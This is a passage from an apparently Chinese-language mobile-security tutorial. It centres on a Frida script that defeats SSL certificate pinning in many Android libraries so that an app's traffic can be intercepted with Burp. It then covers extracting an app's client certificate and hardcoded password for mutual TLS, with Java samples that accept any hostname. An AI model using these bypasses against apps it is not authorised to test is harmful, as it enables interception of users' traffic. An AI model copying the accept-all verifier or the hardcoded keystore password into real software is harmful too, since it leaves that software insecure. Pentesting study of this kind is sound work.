class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] OpenSSLSocketImpl Apache Harmony pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// PhoneGap sslCertificateChecker (https://github.com/EddyVerbruggen/SSLCertificateChecker-PhoneGap-Plugin) //</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> phonegap_Activity = Java.use(<span class="string">&#x27;nl.xservices.plugins.sslCertificateChecker&#x27;</span>);</span><br><span class="line">phonegap_Activity.execute.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;org.json.JSONArray&#x27;</span>, <span class="string">&#x27;org.apache.cordova.CallbackContext&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing PhoneGap sslCertificateChecker: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] PhoneGap sslCertificateChecker pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// IBM MobileFirst pinTrustedCertificatePublicKey (double bypass) //</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass IBM MobileFirst &#123;1&#125;</span></span><br><span class="line"><span class="keyword">var</span> WLClient_Activity_1 = Java.use(<span class="string">&#x27;com.worklight.wlclient.api.WLClient&#x27;</span>);</span><br><span class="line">WLClient_Activity_1.getInstance().pinTrustedCertificatePublicKey.overload(<span class="string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">cert</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing IBM MobileFirst pinTrustedCertificatePublicKey &#123;1&#125;: &#x27;</span> + cert);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] IBM MobileFirst pinTrustedCertificatePublicKey &#123;1&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass IBM MobileFirst &#123;2&#125;</span></span><br><span class="line"><span class="keyword">var</span> WLClient_Activity_2 = Java.use(<span class="string">&#x27;com.worklight.wlclient.api.WLClient&#x27;</span>);</span><br><span class="line">WLClient_Activity_2.getInstance().pinTrustedCertificatePublicKey.overload(<span class="string">&#x27;[Ljava.lang.String;&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">cert</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing IBM MobileFirst pinTrustedCertificatePublicKey &#123;2&#125;: &#x27;</span> + cert);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] IBM MobileFirst pinTrustedCertificatePublicKey &#123;2&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// IBM WorkLight (ancestor of MobileFirst) HostNameVerifierWithCertificatePinning (quadruple bypass) //</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass IBM WorkLight &#123;1&#125;</span></span><br><span class="line"><span class="keyword">var</span> worklight_Activity_1 = Java.use(<span class="string">&#x27;com.worklight.wlclient.certificatepinning.HostNameVerifierWithCertificatePinning&#x27;</span>);</span><br><span class="line">worklight_Activity_1.verify.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;javax.net.ssl.SSLSocket&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing IBM WorkLight HostNameVerifierWithCertificatePinning &#123;1&#125;: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] IBM WorkLight HostNameVerifierWithCertificatePinning &#123;1&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass IBM WorkLight &#123;2&#125;</span></span><br><span class="line"><span class="keyword">var</span> worklight_Activity_2 = Java.use(<span class="string">&#x27;com.worklight.wlclient.certificatepinning.HostNameVerifierWithCertificatePinning&#x27;</span>);</span><br><span class="line">worklight_Activity_2.verify.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.security.cert.X509Certificate&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing IBM WorkLight HostNameVerifierWithCertificatePinning &#123;2&#125;: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] IBM WorkLight HostNameVerifierWithCertificatePinning &#123;2&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass IBM WorkLight &#123;3&#125;</span></span><br><span class="line"><span class="keyword">var</span> worklight_Activity_3 = Java.use(<span class="string">&#x27;com.worklight.wlclient.certificatepinning.HostNameVerifierWithCertificatePinning&#x27;</span>);</span><br><span class="line">worklight_Activity_3.verify.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;[Ljava.lang.String;&#x27;</span>, <span class="string">&#x27;[Ljava.lang.String;&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing IBM WorkLight HostNameVerifierWithCertificatePinning &#123;3&#125;: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] IBM WorkLight HostNameVerifierWithCertificatePinning &#123;3&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass IBM WorkLight &#123;4&#125;</span></span><br><span class="line"><span class="keyword">var</span> worklight_Activity_4 = Java.use(<span class="string">&#x27;com.worklight.wlclient.certificatepinning.HostNameVerifierWithCertificatePinning&#x27;</span>);</span><br><span class="line">worklight_Activity_4.verify.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;javax.net.ssl.SSLSession&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing IBM WorkLight HostNameVerifierWithCertificatePinning &#123;4&#125;: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] IBM WorkLight HostNameVerifierWithCertificatePinning &#123;4&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Conscrypt CertPinManager //</span></span><br><span class="line"><span class="comment">//////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> conscrypt_CertPinManager_Activity = Java.use(<span class="string">&#x27;com.android.org.conscrypt.CertPinManager&#x27;</span>);</span><br><span class="line">conscrypt_CertPinManager_Activity.isChainValid.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.util.List&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing Conscrypt CertPinManager: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] Conscrypt CertPinManager pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CWAC-Netsecurity (unofficial back-port pinner for Android&lt;4.2) CertPinManager //</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> cwac_CertPinManager_Activity = Java.use(<span class="string">&#x27;com.commonsware.cwac.netsecurity.conscrypt.CertPinManager&#x27;</span>);</span><br><span class="line">cwac_CertPinManager_Activity.isChainValid.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.util.List&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing CWAC-Netsecurity CertPinManager: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] CWAC-Netsecurity CertPinManager pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Worklight Androidgap WLCertificatePinningPlugin //</span></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> androidgap_WLCertificatePinningPlugin_Activity = Java.use(<span class="string">&#x27;com.worklight.androidgap.plugin.WLCertificatePinningPlugin&#x27;</span>);</span><br><span class="line">androidgap_WLCertificatePinningPlugin_Activity.execute.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;org.json.JSONArray&#x27;</span>, <span class="string">&#x27;org.apache.cordova.CallbackContext&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing Worklight Androidgap WLCertificatePinningPlugin: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] Worklight Androidgap WLCertificatePinningPlugin pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Netty FingerprintTrustManagerFactory //</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> netty_FingerprintTrustManagerFactory = Java.use(<span class="string">&#x27;io.netty.handler.ssl.util.FingerprintTrustManagerFactory&#x27;</span>);</span><br><span class="line"><span class="comment">//<span class="doctag">NOTE:</span> sometimes this below implementation could be useful</span></span><br><span class="line"><span class="comment">//var netty_FingerprintTrustManagerFactory = Java.use(&#x27;org.jboss.netty.handler.ssl.util.FingerprintTrustManagerFactory&#x27;);</span></span><br><span class="line">netty_FingerprintTrustManagerFactory.checkTrusted.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">type, chain</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing Netty FingerprintTrustManagerFactory&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] Netty FingerprintTrustManagerFactory pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Squareup CertificatePinner [OkHTTP&lt;v3] (double bypass) //</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass Squareup CertificatePinner  &#123;1&#125;</span></span><br><span class="line"><span class="keyword">var</span> Squareup_CertificatePinner_Activity_1 = Java.use(<span class="string">&#x27;com.squareup.okhttp.CertificatePinner&#x27;</span>);</span><br><span class="line">Squareup_CertificatePinner_Activity_1.check.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.security.cert.Certificate&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing Squareup CertificatePinner &#123;1&#125;: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] Squareup CertificatePinner &#123;1&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass Squareup CertificatePinner &#123;2&#125;</span></span><br><span class="line"><span class="keyword">var</span> Squareup_CertificatePinner_Activity_2 = Java.use(<span class="string">&#x27;com.squareup.okhttp.CertificatePinner&#x27;</span>);</span><br><span class="line">Squareup_CertificatePinner_Activity_2.check.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.util.List&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing Squareup CertificatePinner &#123;2&#125;: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] Squareup CertificatePinner &#123;2&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Squareup OkHostnameVerifier [OkHTTP v3] (double bypass) //</span></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass Squareup OkHostnameVerifier &#123;1&#125;</span></span><br><span class="line"><span class="keyword">var</span> Squareup_OkHostnameVerifier_Activity_1 = Java.use(<span class="string">&#x27;com.squareup.okhttp.internal.tls.OkHostnameVerifier&#x27;</span>);</span><br><span class="line">Squareup_OkHostnameVerifier_Activity_1.verify.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.security.cert.X509Certificate&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing Squareup OkHostnameVerifier &#123;1&#125;: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] Squareup OkHostnameVerifier pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass Squareup OkHostnameVerifier &#123;2&#125;</span></span><br><span class="line"><span class="keyword">var</span> Squareup_OkHostnameVerifier_Activity_2 = Java.use(<span class="string">&#x27;com.squareup.okhttp.internal.tls.OkHostnameVerifier&#x27;</span>);</span><br><span class="line">Squareup_OkHostnameVerifier_Activity_2.verify.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;javax.net.ssl.SSLSession&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing Squareup OkHostnameVerifier &#123;2&#125;: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] Squareup OkHostnameVerifier pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Android WebViewClient (double bypass) //</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass WebViewClient &#123;1&#125; (deprecated from Android 6)</span></span><br><span class="line"><span class="keyword">var</span> AndroidWebViewClient_Activity_1 = Java.use(<span class="string">&#x27;android.webkit.WebViewClient&#x27;</span>);</span><br><span class="line">AndroidWebViewClient_Activity_1.onReceivedSslError.overload(<span class="string">&#x27;android.webkit.WebView&#x27;</span>, <span class="string">&#x27;android.webkit.SslErrorHandler&#x27;</span>, <span class="string">&#x27;android.net.http.SslError&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">obj1, obj2, obj3</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing Android WebViewClient &#123;1&#125;&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] Android WebViewClient &#123;1&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass WebViewClient &#123;2&#125;</span></span><br><span class="line"><span class="keyword">var</span> AndroidWebViewClient_Activity_2 = Java.use(<span class="string">&#x27;android.webkit.WebViewClient&#x27;</span>);</span><br><span class="line">AndroidWebViewClient_Activity_2.onReceivedSslError.overload(<span class="string">&#x27;android.webkit.WebView&#x27;</span>, <span class="string">&#x27;android.webkit.WebResourceRequest&#x27;</span>, <span class="string">&#x27;android.webkit.WebResourceError&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">obj1, obj2, obj3</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing Android WebViewClient &#123;2&#125;&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] Android WebViewClient &#123;2&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Apache Cordova WebViewClient //</span></span><br><span class="line"><span class="comment">//////////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> CordovaWebViewClient_Activity = Java.use(<span class="string">&#x27;org.apache.cordova.CordovaWebViewClient&#x27;</span>);</span><br><span class="line">CordovaWebViewClient_Activity.onReceivedSslError.overload(<span class="string">&#x27;android.webkit.WebView&#x27;</span>, <span class="string">&#x27;android.webkit.SslErrorHandler&#x27;</span>, <span class="string">&#x27;android.net.http.SslError&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">obj1, obj2, obj3</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing Apache Cordova WebViewClient&#x27;</span>);</span><br><span class="line">obj3.proceed();</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] Apache Cordova WebViewClient pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Boye AbstractVerifier //</span></span><br><span class="line"><span class="comment">///////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> boye_AbstractVerifier = Java.use(<span class="string">&#x27;ch.boye.httpclientandroidlib.conn.ssl.AbstractVerifier&#x27;</span>);</span><br><span class="line">boye_AbstractVerifier.verify.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">host, ssl</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing Boye AbstractVerifier: &#x27;</span> + host);</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] Boye AbstractVerifier pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#125;, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>启动frida进行hook指定APP的包名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.example.safehttps -l hook.js --no-pause</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/Image-1.png" alt="Image"></p><p>可以看到开启burp抓包成功。</p><h2 id="5-开启双向校验"><a href="#5-开启双向校验" class="headerlink" title="5.开启双向校验"></a>5.开启双向校验</h2><p>双向校验顾名思义也就是服务器也要对客户端进行证书校验，在刚才客户端校验服务端的基础上添加一直被校验的逻辑在里面。</p><p>首先ttt.com所在的nginx服务器要开启双向认证</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/Image-2.png" alt="Image"></p><p>开启客户端的校验后，在浏览器进行访问，会发现返回400，没有被请求的SSL证书发送，是因为浏览器正常请求不会携带证书信息去请求ttt.com</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/im3.png" alt="Image"></p><p>那么如何携带客户端的证书，就要利用burp来操作，将ttt.com的证书添加到TLS客户证书</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-3.png" alt="Image"></p><p>这时再访问</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/Image-ttt.png" alt="Image"></p><p>在APP中进行绑定客户端的证书文件，一般是p12格式文件，会放在assets目录下或者raw目录下，client.p12会有一个密钥内置在代码中，需要找到才能添加进burp中。</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-123456.png" alt="image-20220307190429062"></p><p>这个在反编译后的目录下也能找到，通常在assets或者res/raw目录下查找，但是再导入burp这一步是需要证书密码的，比如上图能明显看到密码是123456，但是找不到证书密码怎么办，可以看一下目录下是否存在lib文件夹，如果存在的话极大可能是将密码写进so层了，这就需要你会IDA反汇编获取证书密钥了，这部分在此不详细阐述，感兴趣的朋友可以先去研究一下。</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/img-p12%20-%20%E5%89%AF%E6%9C%AC.png" alt="image-20220321232207166"></p><h3 id="APP双向校验验证"><a href="#APP双向校验验证" class="headerlink" title="APP双向校验验证"></a>APP双向校验验证</h3><p>服务器校验客户端的证书ClientSSLSocketFactory，服务端将客户端的证书进行绑定。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());</span><br><span class="line">trustManagerFactory.init((KeyStore) <span class="keyword">null</span>);</span><br><span class="line">TrustManager[] trustManagers = trustManagerFactory.getTrustManagers();</span><br><span class="line"><span class="keyword">if</span> (trustManagers.length != <span class="number">1</span> || !(trustManagers[<span class="number">0</span>] <span class="keyword">instanceof</span> X509TrustManager)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Unexpected default trust managers:&quot;</span> + Arrays.toString(trustManagers));</span><br><span class="line">&#125;</span><br><span class="line">trustManager = (X509TrustManager) trustManagers[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">OkHttpClient client = <span class="keyword">new</span> OkHttpClient.Builder()</span><br><span class="line">        .sslSocketFactory(Objects.requireNonNull(ClientSSLSocketFactory.getSocketFactory(getApplicationContext())), Objects.requireNonNull(trustManager))</span><br><span class="line">        .hostnameVerifier(<span class="keyword">new</span> HostnameVerifier() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(String hostname, SSLSession session)</span> </span>&#123;</span><br><span class="line">                <span class="comment">//强行返回true 即验证成功</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;).build();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientSSLSocketFactory</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY_STORE_PASSWORD = <span class="string">&quot;123456&quot;</span>; <span class="comment">// 证书密码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> InputStream client_input;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SSLSocketFactory <span class="title">getSocketFactory</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//客户端证书</span></span><br><span class="line">            client_input = context.getResources().getAssets().open(<span class="string">&quot;client.p12&quot;</span>);</span><br><span class="line">            SSLContext sslContext = SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line">            KeyStore keyStore = KeyStore.getInstance(<span 